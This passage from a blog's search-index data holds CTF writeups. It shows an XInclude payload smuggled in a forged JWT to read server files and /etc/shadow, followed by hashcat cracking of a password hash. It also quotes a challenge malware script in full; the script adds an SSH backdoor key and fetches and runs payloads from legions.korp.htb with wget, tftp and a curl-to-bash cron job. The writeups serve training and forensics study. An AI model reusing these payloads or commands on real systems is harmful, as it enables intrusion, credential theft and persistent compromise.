be:\n{ \u0026#34;data\u0026#34;: \u0026#34;\u0026lt;data\u0026gt;\u0026lt;username\u0026gt;\u0026lt;xi:include xmlns:xi=\\\u0026#34;http://www.w3.org/2001/XInclude\\\u0026#34; parse=\\\u0026#34;text\\\u0026#34; href=\\\u0026#34;file:///app/app.py\\\u0026#34;/\u0026gt;\u0026lt;/username\u0026gt;\u0026lt;/data\u0026gt;\u0026#34; } If we use jwt.io to forge this token and sent it with Burp Repeater, we get this:\nWe were able to read the /app/app.py file!\nNote: This will be HTML encoded so take this output and find an online HTML decoder.\nAfter HTML decoding, we get this:\nimport flask from flask import Flask, render_template, request, url_for import jwt from lxml import etree import os import re import tempfile app = Flask(__name__) FLAG = os.environ.get(\u0026#39;FLAG\u0026#39;) or \u0026#39;wcft{fake-flag}\u0026#39; FLAGUSER_PASSWORD = os.environ.get(\u0026#39;FLAGUSER_PASSWORD\u0026#39;) or \u0026#39;fake-password\u0026#39; JWT_SECRET = os.environ.get(\u0026#39;JWT_SECRET\u0026#39;) or \u0026#39;secret\u0026#39; JWT_ALG = \u0026#39;HS256\u0026#39; JWT_COOKIE = \u0026#39;appdata\u0026#39; @app.route(\u0026#39;/\u0026#39;) def root(): return render_template(\u0026#34;index.html\u0026#34;) @app.route(\u0026#39;/secret-welcome-935734\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def secret_welcome(): # There is a linux user named \u0026#39;flaguser\u0026#39; # Login here with that username and their linux password. auth = request.authorization if auth is None or auth.username != \u0026#39;flaguser\u0026#39; or auth.password != FLAGUSER_PASSWORD: resp = flask.Response(\u0026#39;Please provide the right credentials to get the flag\u0026#39;) resp.headers[\u0026#39;WWW-Authenticate\u0026#39;] = \u0026#39;Basic\u0026#39; return resp, 401 return f\u0026#39;Congrats, here is your flag: {FLAG}\u0026#39; @app.route(\u0026#39;/welcome\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def welcome(): cookie = request.cookies.get(JWT_COOKIE) if not cookie: return f\u0026#39;Error: missing {JWT_COOKIE} cookie value\u0026#39; try: jwtData = jwt.decode(cookie, JWT_SECRET, algorithms=[JWT_ALG]) except: return \u0026#39;Error: unable to decode JWT cookie\u0026#39;, 400 data = jwtData[\u0026#39;data\u0026#39;] if not data: return \u0026#39;Error: missing data field from decoded JWT\u0026#39;, 400 xmlText = str(data) if \u0026#39;\u0026amp;\u0026#39; in xmlText: return \u0026#39;Error: No entity references please\u0026#39;, 400 if \u0026#39;%\u0026#39; in xmlText: return \u0026#39;Error: No parameter file entities please\u0026#39;, 400 tmp = tempfile.NamedTemporaryFile() # Open the file for writing. with open(tmp.name, \u0026#39;w\u0026#39;) as f: f.write(xmlText) try: parser = etree.XMLParser(resolve_entities=False) xmlDoc = etree.parse(tmp.name, parser=parser) xmlDoc.xinclude() except Exception as e: print(\u0026#39;XML Error:\u0026#39;, e) return \u0026#39;Error: Error parsing XML\u0026#39;, 400 usernameElement = xmlDoc.find(\u0026#39;username\u0026#39;) if usernameElement is None: return \u0026#39;Error: Missing username element in XML\u0026#39;, 400 username = usernameElement.text return render_template(\u0026#34;welcome.html\u0026#34;, username=username) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def register(): username = request.form.get(\u0026#39;username\u0026#39;) if not username: return \u0026#39;Error: username is required\u0026#39;, 400 username = str(username) if not re.match(\u0026#39;^[a-z]+$\u0026#39;, username): return \u0026#39;Error: username must be only lowercase letters\u0026#39;, 400 if len(username) \u0026lt; 3: return \u0026#39;Error: username must be at least 3 letters\u0026#39;, 400 if len(username) \u0026gt; 20: return \u0026#39;Error: username must be no longer than 20 letters\u0026#39;, 400 # Useful for chal development # username = \u0026#39;\u0026lt;xi:include xmlns:xi=\u0026#34;http://www.w3.org/2001/XInclude\u0026#34; href=\u0026#34;/app/app.py\u0026#34; parse=\u0026#34;text\u0026#34;/\u0026gt;\u0026#39; xml = f\u0026#39;\u0026lt;data\u0026gt;\u0026lt;username\u0026gt;{username}\u0026lt;/username\u0026gt;\u0026lt;/data\u0026gt;\u0026#39; jwtData = {\u0026#34;data\u0026#34;: xml} cookie = jwt.encode(jwtData, JWT_SECRET, algorithm=JWT_ALG) response = flask.make_response(f\u0026#39;hello {username}\u0026#39;) response.set_cookie(JWT_COOKIE, cookie) response.headers[\u0026#39;location\u0026#39;] = url_for(\u0026#39;welcome\u0026#39;) return response, 302 if __name__ == \u0026#34;__main__\u0026#34;: app.run(debug=False) Where is the FLAG? # We can tell from this source code and its comments that:\nthe flag is in environment variable named FLAG\nthere is a /secret-welcome-935734 endpoint that will return the flag IF we give it some special username/password\nFor this who know about Linux, a process\u0026rsquo; environment is available at a magic file path: /proc/self/environ\nHowever, if we try to read this file path like we read /app/app.py we get this returned:\nError: Error parsing XML This is because /proc/self/environ returns a mixture of text and binary data and something about the binary data causes this error even though we parse=\u0026quot;text\u0026quot;.\nMaybe there is some way to read it like this but I don\u0026rsquo;t know how.\nThat leaves the /secret-welcome-935734 endpoint.\nWe see this endpoint wants us to provide basic-auth credentials with:\nusername: flaguser password: linux password of flag user We know this from these comments:\n# There is a linux user named \u0026#39;flaguser\u0026#39; # Login here with that username and their linux password. Cracking a Linux Password # How can we learn the password of a Linux user named flaguser?\nIf you google around a bit, you might learn about the /etc/shadow file.\nIf we use our JWT forging powers to read this file we get:\nWelcome root:*:19764:0:99999:7::: daemon:*:19764:0:99999:7::: bin:*:19764:0:99999:7::: sys:*:19764:0:99999:7::: sync:*:19764:0:99999:7::: games:*:19764:0:99999:7::: man:*:19764:0:99999:7::: lp:*:19764:0:99999:7::: mail:*:19764:0:99999:7::: news:*:19764:0:99999:7::: uucp:*:19764:0:99999:7::: proxy:*:19764:0:99999:7::: www-data:*:19764:0:99999:7::: backup:*:19764:0:99999:7::: list:*:19764:0:99999:7::: irc:*:19764:0:99999:7::: _apt:*:19764:0:99999:7::: nobody:*:19764:0:99999:7::: flaguser:$1$hack$BzqsFHqkPjQ2Sn9amFsgN0:19767:0:99999:7::: Now we need to crack this flaguser hash.\nIf we check some online resources, we will learn that the actual hash is just part of the above line:\n$1$hack$BzqsFHqkPjQ2Sn9amFsgN0 But what hash format is this in?\nWhile I prefer hashcat, one trick I like to use is to let an alternative program called john to identify the hash for me.\nLet\u0026rsquo;s put this hash in john.txt and run:\njohn john.txt The first line that comes out is:\nWarning: detected hash type \u0026#34;md5crypt\u0026#34;, but the string is also recognized as \u0026#34;md5crypt-long\u0026#34; If we run hashcat --help and search for md5crypt we get:\n500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) So 500 is the mode we want with hashcat.\nJust as before, we have the option of using a dictionary or brute forcing.\nYou can try a file like rockyou.txt but that won\u0026rsquo;t find it.\nNext let\u0026rsquo;s try brute forcing:\nhashcat --potfile-disable -a 3 -m 500 john.txt Similar arguments as before but -m is different this time.\nThis ends with the following output:\n$1$hack$BzqsFHqkPjQ2Sn9amFsgN0:qqz3 Session..........: hashcat Status...........: Cracked Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)) Hash.Target......: $1$hack$BzqsFHqkPjQ2Sn9amFsgN0 Time.Started.....: Sun Mar 17 16:42:37 2024 (45 secs) Time.Estimated...: Sun Mar 17 16:43:22 2024 (0 secs) Kernel.Feature...: Pure Kernel Guess.Mask.......: ?1?2?2?2 [4] Guess.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined Guess.Queue......: 4/15 (26.67%) Speed.#3.........: 54264 H/s (9.82ms) @ Accel:256 Loops:125 Thr:1 Vec:4 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 2453504/2892672 (84.82%) Rejected.........: 0/2453504 (0.00%) Restore.Point....: 36864/46656 (79.01%) Restore.Sub.#3...: Salt:0 Amplifier:40-41 Iteration:875-1000 Candidate.Engine.: Device Generator Candidates.#3....: qaz3 -\u0026gt; qb4o Hardware.Mon.SMC.: Fan0: 66%, Fan1: 66% Hardware.Mon.#3..: Temp: 82c Started: Sun Mar 17 16:42:29 2024 Stopped: Sun Mar 17 16:43:24 2024 This ran in just under one minute and yields the secret: qqz3\nGetting the Flag # We can now use a browser to go to the secret endpoint and enter these credentials:\nusername: flaguser password: qqz3 and we are given the flag:\nCongrats, here is your flag: wctf{cr4ck1n_4nd_1nclud1n_4_th3_w1n_1352234}\nFORENSICS: Eternally Pwned: Infiltration # Description: I recently had my passwords and other sensitive data leaked, but I have no idea how. Can you figure out how the attacker got in to my PC?\nWe are given a pcap file upon analyzing it in Wireshark under protocol hierarchy we establish there is HTTP , SMB etc. Checking the http traffic we see requests for normal browsing sessions. On SMB we find interesting base64 strings as shown below.\nDecoding it on CyberChef we get our flag\nflag: wctf{l3tS_3teRn4lLy_g0_bLU3_7n9wm4iWnL} Reminds me of the famous eternal blue windows exploit Eternal Blue\nFORENSICS: Eternally Pwned Persistence # Description: I get that the attackers were in my PC, but how did they achieve persistence?\nTo analyze how attackers achieved persistence on your system, we can utilize Volatility, a popular open-source memory forensics framework. With a memory dump provided, we can extract valuable information to understand the techniques used by the attackers to maintain access to the system. I did use Volatitilty3 for this challenge.\npython vol.py -f MEMORY.DMP windows.pslist I found a suspicious process with the name cGFzdGViaW4uY2 with the pid : 1804\nI proceeded with the analysis with checking the command line arguments using Volatitilty\u0026rsquo;s module windows.cmdline and found the suspicious process full path with it\u0026rsquo;s file name encoded in base64 Decoding it on CyberChef I got a pastebin link ","date":"March 20, 2024","externalUrl":null,"permalink":"/posts/2024-03-17-wolvctf2024/","section":"Posts","summary":"\u003cp\u003eThis is a writeup for , forensics and web challenges from WolvCTF 2024\u003c/p\u003e\n\n\u003ch2 class=\"relative group\"\u003eForensics: Hidden Data [Beginner]\n    \u003cdiv id=\"forensics-hidden-data-beginner\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"text-primary-300 dark:text-neutral-700 !no-underline\" href=\"#forensics-hidden-data-beginner\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e\n    \n\u003c/h2\u003e\n\u003cp\u003eQuestion: WOLPHV sent me this file. Not sure what to comment about it\u003c/p\u003e","title":"WolvCTF 2024 - Writeups","type":"posts"},{"content":"","date":"March 17, 2024","externalUrl":null,"permalink":"/categories/forensics/","section":"Categories","summary":"","title":"Forensics","type":"categories"},{"content":"","date":"March 17, 2024","externalUrl":null,"permalink":"/tags/htb/","section":"Tags","summary":"","title":"Htb","type":"tags"},{"content":"This is a writeup for forensics for HTB 2024\nUrgent [Very Easy]\nWe are given an email file .eml file.\nPrinting out its contents we notice base64 encoding Using CyberChef we are able to decode the encoded string and its magic operation can detect the encoding also. We get our flag. It Has Begun [Very Easy] We are given a script sh file\n#!/bin/sh if [ \u0026#34;$HOSTNAME\u0026#34; != \u0026#34;KORP-STATION-013\u0026#34; ]; then exit fi if [ \u0026#34;$EUID\u0026#34; -ne 0 ]; then exit fi docker kill $(docker ps -q) docker rm $(docker ps -a -q) echo \u0026#34;ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w{BTH\u0026#34; \u0026gt;\u0026gt; /root/.ssh/authorized_keys echo \u0026#34;nameserver 8.8.8.8\u0026#34; \u0026gt;\u0026gt; /etc/resolv.conf echo \u0026#34;PermitRootLogin yes\u0026#34; \u0026gt;\u0026gt; /etc/ssh/sshd_config echo \u0026#34;128.90.59.19 legions.korp.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts for filename in /proc/*; do ex=$(ls -latrh $filename 2\u0026gt; /dev/null|grep exe) if echo $ex |grep -q \u0026#34;/var/lib/postgresql/data/postgres\\|atlas.x86\\|dotsh\\|/tmp/systemd-private-\\|bin/sysinit\\|.bin/xorg\\|nine.x86\\|data/pg_mem\\|/var/lib/postgresql/data/.*/memory\\|/var/tmp/.bin/systemd\\|balder\\|sys/systemd\\|rtw88_pcied\\|.bin/x\\|httpd_watchdog\\|/var/Sofia\\|3caec218-ce42-42da-8f58-970b22d131e9\\|/tmp/watchdog\\|cpu_hu\\|/tmp/Manager\\|/tmp/manh\\|/tmp/agettyd\\|/var/tmp/java\\|/var/lib/postgresql/data/pоstmaster\\|/memfd\\|/var/lib/postgresql/data/pgdata/pоstmaster\\|/tmp/.metabase/metabasew\u0026#34;; then result=$(echo \u0026#34;$filename\u0026#34; | sed \u0026#34;s/\\/proc\\///\u0026#34;) kill -9 $result echo found $filename $result fi done ARCH=$(uname -m) array=(\u0026#34;x86\u0026#34; \u0026#34;x86_64\u0026#34; \u0026#34;mips\u0026#34; \u0026#34;aarch64\u0026#34; \u0026#34;arm\u0026#34;) if [[ $(echo ${array[@]} | grep -o \u0026#34;$ARCH\u0026#34; | wc -w) -eq 0 ]]; then exit fi cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777 0xda4.0xda4.$ARCH; ./0xda4.0xda4.$ARCH; cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; tftp legions.korp.htb -c get 0xda4.0xda4.$ARCH; cat 0xda4.0xda4.$ARCH \u0026gt; DVRHelper; chmod +x *; ./DVRHelper $ARCH; cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d || cd /; busybox wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777;./0xda4.0xda4.$ARCH; echo \u0026#34;*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c \u0026#39;NG5kX3kwdVJfR3IwdU5kISF9\u0026#39; \u0026#34; \u0026gt;\u0026gt; /etc/crontab Upon analyzing the script we see the username user@tS_u0y_ll1w{BTH and NG5kX3kwdVJfR3IwdU5kISF9 that look suspicious.\nReversing the first string user@tS_u0y_ll1w{BTH and decoding the base64 string NG5kX3kwdVJfR3IwdU5kISF9 we get our flag\n","date":"March 17, 2024","externalUrl":null,"permalink":"/posts/2024-03-21-htbctf2024/","section":"Posts","summary":"\u003cp\u003eThis is a writeup for forensics for HTB 2024\u003c/p\u003e\n\u003cp\u003eUrgent [Very Easy]\u003c/p\u003e\n\u003cp\u003eWe are given an email file \u003ccode\u003e.eml\u003c/code\u003e file.\u003c/p\u003e\n\u003cp\u003ePrinting out its contents we notice base64 encoding\n\u003cfigure\u003e\u003cimg\n    class=\"my-0 rounded-md\"\n    loading=\"lazy\"\n    decoding=\"async\"\n    fetchpriority=\"low\"\n    alt=\"beginner1.png\"\n    src=\"/assets/posts/htbctfapocalpyse2024/eml.png\"\n    \u003e\u003c/figure\u003e\n\u003c/p\u003e","title":"HTB CYBER-APOCALYPSE 2024 FORENSICS WRITEUPS","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/jwt/","section":"Categories","summary":"","title":"Jwt","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/categories/web/","section":"Categories","summary":"","title":"Web","type":"categories"}]